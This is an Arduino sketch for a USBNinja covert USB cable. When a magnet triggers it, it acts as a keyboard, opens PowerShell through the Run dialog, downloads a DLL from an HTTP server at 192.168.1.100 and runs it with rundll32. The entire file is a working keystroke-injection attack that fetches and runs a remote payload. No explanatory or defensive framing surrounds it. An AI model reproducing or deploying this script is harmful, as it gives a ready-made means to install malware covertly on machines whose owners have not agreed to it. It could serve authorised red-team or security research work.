#define LAYOUT_UNITED_KINGDOM

#include <NinjaKeyboard.h>

void setup() {
    pinMode(USBDIRECTPIN, INPUT);
}

void loop() {
    //If a magnet is near, Pin 0 will turn to low
    if (digitalRead(USBDIRECTPIN) == LOW) {
        pinMode(USBDIRECTPIN, OUTPUT);

        // Initiate keyboard
        USBninjaOnline();
        NinjaKeyboard.begin();
        NinjaKeyboard.delay(1000);
        // Send HID '0' to compatibility Win7
        NinjaKeyboard.sendKeyStroke(0);
        NinjaKeyboard.delay(1000);
        // WIN + R
        NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        NinjaKeyboard.delay(100);
        // Start PowerShell
        NinjaKeyboard.print(F("powershell.exe"));
        NinjaKeyboard.delay(100);
        // ENTER
        NinjaKeyboard.sendKeyStroke(KEY_ENTER);
        NinjaKeyboard.delay(500);
        // Download, execute payload and exit powershell
        NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.1.100:8081/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
        NinjaKeyboard.delay(100);
        // Stop and remove keyboard
        NinjaKeyboard.end();
        USBninjaOffline();

        pinMode(USBDIRECTPIN,INPUT);
    }
}

void payloadA(){
}

void payloadB(){
}
